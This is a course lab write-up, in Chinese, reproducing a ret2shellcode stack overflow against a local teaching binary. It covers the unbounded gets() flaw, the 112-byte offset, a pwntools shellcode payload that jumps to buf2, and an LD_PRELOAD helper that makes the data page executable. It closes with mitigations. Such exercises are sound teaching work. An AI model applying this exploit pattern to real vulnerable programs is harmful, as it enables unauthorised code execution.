# ret2shellcode 复现记录

本记录针对课程 PDF 配套程序 `/home/xyx/Desktop/ex2/ret2shellcode`，只在本机教学样例上复现。

## 1. 实验原理

程序在 `main` 中先用 `gets` 把输入写入栈上的局部数组，再用 `strncpy` 将最多 100 字节复制到全局数组 `buf2`。`gets` 没有长度检查，因此可以同时完成两件事：

1. 把 32 位 Linux `execve("/bin/sh")` shellcode 放进输入，并由 `strncpy` 复制到 `buf2`。
2. 用 112 字节的填充到达保存的返回地址，把它改成 `buf2` 的地址 `0x0804a080`。

`main` 返回时，CPU 跳到 `buf2` 执行 shellcode，从而得到 shell。

## 2. 环境与检查

```bash
file /home/xyx/Desktop/ex2/ret2shellcode
checksec --file=/home/xyx/Desktop/ex2/ret2shellcode
```

关键结果：

```text
ELF 32-bit LSB executable, Intel 80386
No canary found
No PIE (0x8048000)
buf2 = 0x0804a080
```

反汇编显示：

```text
lea    0x1c(%esp),%eax   # gets 的目标地址
call   gets@plt
...
lea    0x1c(%esp),%eax
...
movl   $0x0804a080,(%esp) # strncpy 的目标 buf2
call   strncpy@plt
```

用 `cyclic(300)` 覆盖后，返回时 EIP 为 `0x62616164`，对应：

```python
cyclic_find(0x62616164, n=4) == 112
```

因此 payload 布局是：

```text
[44 字节 shellcode] [NOP 填充至 112 字节] [p32(0x0804a080)]
```

## 3. 新内核兼容说明

课件假定 `buf2` 所在页具有 RWX 权限。当前机器的 ELF 程序头把数据段标为 RW，现代内核不会执行其中的代码。为保持课件中的 ret2shellcode 路径，`ret2shellcode_rwx.c` 是一个仅用于这个本地样例的 `LD_PRELOAD` 启动辅助库，在程序启动时把 `0x0804a000` 页临时改为 RWX。它不修改目标文件。

## 4. 一键复现

```bash
cd /home/xyx/Desktop/ret2shellcode_repro
gcc -m32 -shared -fPIC ret2shellcode_rwx.c -o /tmp/ret2shellcode_rwx.so
python3 exploit.py
```

交互 shell 中输入：

```text
echo RET2SHELLCODE_OK
```

成功时可看到：

```text
RET2SHELLCODE_OK
```

也可以把 `exploit.py` 中的 `io.interactive()` 替换为 `io.recvrepeat(1)`，用于非交互验证。

## 5. 代码说明

`exploit.py` 使用 pwntools 生成 shellcode：

```python
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(112, b"\x90") + p32(0x0804a080)
```

`ljust` 产生 NOP 填充，避免 shellcode 长度变化影响返回地址位置；`p32` 按小端序编码 32 位地址。

## 6. 常见失败现象

- 直接跳到 `0x0804a080` 后 SIGSEGV：通常是数据页没有执行权限。先编译并加载上面的辅助库。
- 返回地址错位：重新用 `cyclic(300)` 测试，并用 `cyclic_find` 计算偏移；本样例的正确偏移为 112。
- `gcc -m32` 缺少头文件或库：安装发行版的 32 位开发包（例如 Debian/Ubuntu 的 `gcc-multilib`、`libc6-dev-i386`）。

## 7. 防护改进

该程序的漏洞来自无界 `gets`，应改为带长度限制的 `fgets`，并启用栈 canary、PIE、RELRO 与 NX。即使开启 NX，也不能替代边界检查；NX 主要阻止数据页直接执行。
